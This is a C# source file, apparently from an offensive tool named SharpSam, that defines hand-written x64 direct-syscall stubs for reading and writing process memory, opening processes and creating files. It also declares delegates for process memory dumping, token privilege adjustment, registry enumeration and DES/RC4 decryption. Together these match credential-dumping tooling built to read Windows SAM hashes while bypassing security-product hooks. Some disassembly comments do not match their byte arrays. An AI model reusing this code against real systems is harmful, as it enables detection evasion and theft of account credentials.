using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using static SharpSam.Crypto.BCrypt;
using static SharpSam.Native;

namespace SharpSam
{
        class Sys
        {
            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0x0f
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret

            static byte[] bZwClose10 = { 0x49, 0x89, 0xCA, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0x3A
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret

            static byte[] bZwWriteVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0x50
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret

            static byte[] bZwProtectVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0x55
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret

            static byte[] bNtCreateFile10 = { 0x49, 0x89, 0xCA, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            ///0:  49 89 ca                mov r10,rcx
            ///3:  b8 26 00 00 00          mov eax,0x26
            ///8:  0f 05                   syscall
            ///a:  c3                      ret

            static byte[] bZwOpenProcess10 = { 0x49, 0x89, 0xCA, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0xC6
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret

            static byte[] bNtCreateTransaction10 = { 0x49, 0x89, 0xCA, 0xB8, 0xC6, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            static byte[] bNtReadVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3f, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0x3f
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret

            const int memoryPtrotection = 0x40;

            /// 0:  49 89 ca                mov r10,rcx
            /// 3:  b8 0f 00 00 00          mov eax,0x0f
            /// 8:  0f 05                   syscall
            /// a:  c3                      ret


            public static NTSTATUS NtCreateTransaction10(out IntPtr tHandle, int desiredAccess, IntPtr objAttr, IntPtr Uow, IntPtr TmHandle, ulong createOptions, ulong isolationLevel, ulong isolationFlags, IntPtr Timeout, IntPtr Description)
            {
                byte[] syscall = bNtCreateTransaction10;

                IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

                Delegates.NtCreateTransaction myAssemblyFunction = (Delegates.NtCreateTransaction)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateTransaction));

                return (NTSTATUS)myAssemblyFunction(out tHandle, desiredAccess, objAttr, Uow, TmHandle, createOptions, isolationLevel, isolationFlags, Timeout, Description);
            }

            private static IntPtr GetKernelbase()
            {

                return LoadLibrary("Kernelbase.dll");

            }

            public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
            {
                IntPtr proc = GetProcAddress(GetKernelbase(), "VirtualProtect");
                Sys.Delegates.VirtualProtect VirtualProtect = (Sys.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(proc, typeof(Sys.Delegates.VirtualProtect));
                return VirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);
            }

            public static NTSTATUS NtReadVirtualMemory10(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead)
            {
                byte[] syscall = bNtReadVirtualMemory10;

                GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
                IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

                if (!VirtualProtect(memoryAddress,
                    (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
                {
                    throw new Win32Exception();
                }

                Delegates.NtReadVirtualMemory myAssemblyFunction = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtReadVirtualMemory));

                return (NTSTATUS)myAssemblyFunction(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);

            }

            public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
            {
                byte[] syscall = bZwOpenProcess10;

                IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

                Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

                return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);

            }

            public static NTSTATUS ZwClose10(IntPtr handle)
            {
                byte[] syscall = bZwClose10;

                IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

                Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose));

                return (NTSTATUS)myAssemblyFunction(handle);

            }

            public static NTSTATUS ZwWriteVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
            {
                byte[] syscall = bZwWriteVirtualMemory10;

                IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

                Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

                return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);

            }

            public static NTSTATUS ZwProtectVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten)
            {
                byte[] syscall = bZwProtectVirtualMemory10;

                IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

                Delegates.ZwProtectVirtualMemory myAssemblyFunction = (Delegates.ZwProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwProtectVirtualMemory));

                return (NTSTATUS)myAssemblyFunction(hProcess, ref lpBaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);

            }

            public static NTSTATUS NtCreateFile10(out IntPtr fileHandle, Int32 desiredAccess, ref OBJECT_ATTRIBUTES objectAttributes, out IO_STATUS_BLOCK ioStatusBlock, ref Int64 allocationSize, UInt32 fileAttributes, System.IO.FileShare shareAccess, UInt32 createDisposition, UInt32 createOptions, IntPtr eaBuffer, UInt32 eaLength)
            {
                byte[] syscall = bNtCreateFile10;

                IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

                Delegates.NtCreateFile myAssemblyFunction = (Delegates.NtCreateFile)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateFile));

                return (NTSTATUS)myAssemblyFunction(out fileHandle, desiredAccess, ref objectAttributes, out ioStatusBlock, ref allocationSize, fileAttributes, shareAccess, createDisposition, createOptions, eaBuffer, eaLength);

            }

            public struct Delegates
            {
                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int NtCreateTransaction(out IntPtr tHandle, int desiredAccess, IntPtr objAttr, IntPtr Uow, IntPtr TmHandle, ulong createOptions, ulong isolationLevel, ulong isolationFlags, IntPtr Timeout, IntPtr Description);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int ZwClose(IntPtr handle);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int ZwProtectVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int NtCreateFile(out IntPtr fileHandle, Int32 desiredAccess, ref OBJECT_ATTRIBUTES objectAttributes, out IO_STATUS_BLOCK ioStatusBlock, ref Int64 allocationSize, UInt32 fileAttributes, System.IO.FileShare shareAccess, UInt32 createDisposition, UInt32 createOptions, IntPtr eaBuffer, UInt32 eaLength);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate IntPtr GetCurrentProcess();

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool CloseHandle(IntPtr handle);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint newprotect, out uint oldprotect);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool LookupPrivilegeValue(String lpSystemName, String lpName, ref LUID luid);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate int PssCaptureSnapshot(IntPtr ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, int ThreadContextFlags, ref IntPtr SnapshotHandle);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptAcquireContextA(ref IntPtr phProv, string szContainer, string szProvider, uint dwProvType, uint dwFlags);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptSetKeyParam(IntPtr hKey, uint dwParam, IntPtr pbData, uint dwFlags);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptDestroyKey(IntPtr hKey);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptImportKey(IntPtr hProv, IntPtr pbData, uint dwDataLen, IntPtr hPubKey, uint dwFlags, ref IntPtr phKey);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptGetProvParam(IntPtr hProv, uint dwParam, IntPtr pbData, ref uint pdwDataLen, uint dwFlags);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptExportKey(IntPtr hKey, IntPtr hExpKey, uint dwBlobType, uint dwFlags, IntPtr pbData, ref uint pdwDataLen);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate bool CryptGenKey(IntPtr hProv, uint Algid, uint dwFlags, IntPtr phKey);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
                public delegate bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, IntPtr pbData, ref uint pdwDataLen);


                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int flags);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                internal delegate int BCryptDestroyKey(IntPtr hKey);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate int BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);
                
                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate int BCryptSetProperty(SafeHandle hProvider, string pszProperty, string pbInput, int cbInput, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptGenerateSymmetricKey(SafeBCryptAlgorithmHandle hAlgorithm, out SafeBCryptKeyHandle phKey, IntPtr pbKeyObject, int cbKeyObject, IntPtr pbSecret, int cbSecret, int flags);

            [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate int BCryptDecrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput,int  cbOutput, out int pcbResult, int dwFlags);
                
                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate int BCryptEncrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate int RtlEncryptDecryptRC4(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key);


                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, ref SECURITY_ATTRIBUTES lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate int RegQueryValueEx(IntPtr hKey, string lpValueName, IntPtr lpReserved, ref uint lpType, IntPtr lpData, ref uint lpcbData);


                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
                public delegate int RegEnumKeyExW(IntPtr hKey, uint dwIndex, IntPtr lpName, IntPtr lpcchName, IntPtr lpReserved, IntPtr lpClass, IntPtr lpcchClass, IntPtr lpftLastWriteTime);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, IntPtr lpName);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, long dwNumberOfBytesToMap);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool UnmapViewOfFile(IntPtr lpBaseAddress);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool ConvertSidToStringSid(byte[] pSID, out string ptrSid);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool ConvertSidToStringSid2(IntPtr pSID, out string ptrSid);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool ConvertStringSidToSid(string stringsid, out IntPtr ptrSid);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, ACCESS_MASK samDesired, IntPtr phkResult);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate int RegQueryInfoKeyW(IntPtr hKey, IntPtr lpClass, IntPtr lpcchClass, ref uint lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen, IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen, IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
                public delegate int RegCloseKey(IntPtr hKey);

                [SuppressUnmanagedCodeSecurity]
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate int RtlDecryptDES2blocks1DWORD(byte[] data, ref UInt32 key, IntPtr output);
            }
        }
}
